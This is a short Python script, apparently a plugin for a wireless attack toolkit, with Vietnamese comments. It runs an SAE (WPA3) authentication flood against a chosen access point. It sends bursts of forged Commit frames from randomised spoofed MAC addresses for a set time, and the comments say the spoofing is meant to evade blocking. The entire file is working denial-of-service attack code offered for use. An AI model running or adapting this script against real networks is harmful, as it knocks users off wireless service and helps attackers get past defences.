# plugins/sae_dos_test.py
import sys
import time
from scapy.all import RadioTap, Dot11, Dot11Auth, sendp, RandMAC

def main():
    if len(sys.argv) < 4:
        print("[-] Lỗi: Thiếu tham số.")
        sys.exit(1)
        
    interface = sys.argv[1]
    target_bssid = sys.argv[2].lower()
    duration = int(sys.argv[3])

    print("\n[*] Bắt đầu chiến dịch: SAE Authentication Flood (DoS)")
    print(f"    - Mục tiêu AP: {target_bssid}")
    print(f"    - Thời gian  : {duration} giây")
    print(f"[*] Đang giả mạo hàng loạt địa chỉ MAC để gửi yêu cầu xác thực SAE...")
    
    end_time = time.time() + duration
    count = 0
    
    try:
        # Vòng lặp bắn gói tin liên tục cho đến khi hết thời gian
        while time.time() < end_time:
            # Tạo MAC ngẫu nhiên cho mỗi cụm gói tin để tránh bị block
            fake_client_mac = str(RandMAC())
            
            # Gói tin Auth với thuật toán số 3 (SAE Authentication)
            dot11 = Dot11(addr1=target_bssid, addr2=fake_client_mac, addr3=target_bssid)
            # algo=3 (SAE), seqnum=1 (Commit frame)
            auth_frame = RadioTap() / dot11 / Dot11Auth(algo=3, seqnum=1, status=0)
            
            # Bắn 10 gói một lúc cho mỗi MAC giả mạo
            sendp(auth_frame, iface=interface, count=10, inter=0.01, verbose=False)
            count += 10
            
    except KeyboardInterrupt:
        print("\n[!] Đã ép dừng chiến dịch.")

    print(f"\n[+] Đã bắn tổng cộng khoảng {count} gói SAE Auth rác vào Router.")
    print("[+] Hoàn tất chiến dịch.")

if __name__ == "__main__":
    main()